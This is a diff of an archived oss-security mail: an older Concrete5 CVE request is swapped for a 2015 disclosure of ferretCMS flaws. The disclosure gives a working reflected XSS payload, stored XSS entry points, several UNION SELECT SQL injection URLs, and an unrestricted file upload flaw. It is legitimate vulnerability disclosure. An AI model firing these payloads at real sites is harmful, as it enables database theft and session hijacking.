@@ -1,31 +1,104 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/02/1
-Message-ID: <20150102194358.GA31666@kludge.henri.nerv.fi>
-Date: Fri, 2 Jan 2015 21:43:58 +0200
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/23/3
+Message-ID: <CALH-=7wWJbiiD_QcrczrbWk6p30WQeHdHGQBjFk6GQQmxsnipw@mail.gmail.com>
+Date: Fri, 23 Jan 2015 07:14:56 +0100
+From: Steffen Rösemann <steffen.roesemann1986@...il.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org, abuse@...crete5.org, security@...crete5.org, Simo Ben youssef <simo@...xploit.com>
-Subject: CVE request: Concrete5 XSS vulnerability
+Subject: CVE-Request -- ferretCMS v.1.0.4-alpha -- Multiple reflecting/stored XSS- and SQLi-vulnerabilities, unrestricted file upload
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi Josh, Steve, vendors, list.
 
-Can you assign CVE identifier for following vulnerability in Concrete5, thanks.
+I found multiple reflecting/stored XSS- and SQLi-vulnerabilities as well as
+an unrestricted file upload in the CMS ferretCMS v.1.0.4 which is currently
+in the alpha development stage.
 
-http://seclists.org/bugtraq/2014/Dec/53
-http://osvdb.org/115633
-http://osvdb.org/115634
+============
+Reflecting XSS
+============
 
-ps. there is something wrong with http://www.openwall.com/lists/oss-security/ it
-says "an error occurred while processing this directive"
+http://
+{TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
 
-- -- 
-Henri Salo
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
+============
+Stored XSS
+============
 
-iEYEARECAAYFAlSm9P4ACgkQXf6hBi6kbk+bfQCgjF/EWeO4Wfs0SUSsq96LwNpE
-AWAAn1yKEw9eDAlJ6cQczjzHZ7VGdXUp
-=0mVH
------END PGP SIGNATURE-----
+1.
+via login-form of the administrative backend, input field for username:
+
+http://{TARGET}/admin.php
+
+executed here in the logevent functionality in the backend:
+
+http://{TARGET}/admin.php?type=log&action=read
+
+2.
+
+via the new blog-post form, input field for pagetitle:
+
+http://{TARGET}/admin.php?type=page&action=insert&p=
+
+executed, for example, here:
+
+http://{TARGET}/admin.php?type=page&action=read
+
+============
+SQLi
+============
+
+http://
+{TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
+
+http://
+{TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+
+
+http://
+{TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+
+
+http://
+{TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+
+
+http://
+{TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+
+
+http://
+{TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
+
+http://
+{TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+
+
+==================
+Unrestricted file upload
+==================
+
+An administrator has the opportunity to upload arbitrary files via a form
+located here on a common ferretCMS installation:
+
+http://{TARGET}/admin.php?type=uploader&action=upload
+
+As these files aren't renamed and stored in the following location, any
+unauthenticated user is able to read/execute those files, too:
+
+http://{TARGET}/custom/uploads/{NAME_OF_THE_FILE}
+
+
+
+Could you please assign a CVE-ID / CVE-IDs for these issues.
+
+Thank you very much!
+
+Greetings.
+
+Steffen Rösemann
+
+References:
+
+[1] https://github.com/JRogaishio/ferretCMS
+[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-10.html
+[3] https://github.com/JRogaishio/ferretCMS/issues/63
+[4] https://github.com/sroesemann/ferretCMS
+[5] http://seclists.org/fulldisclosure/2015/Jan/98
+[6]
+http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-10.html
+
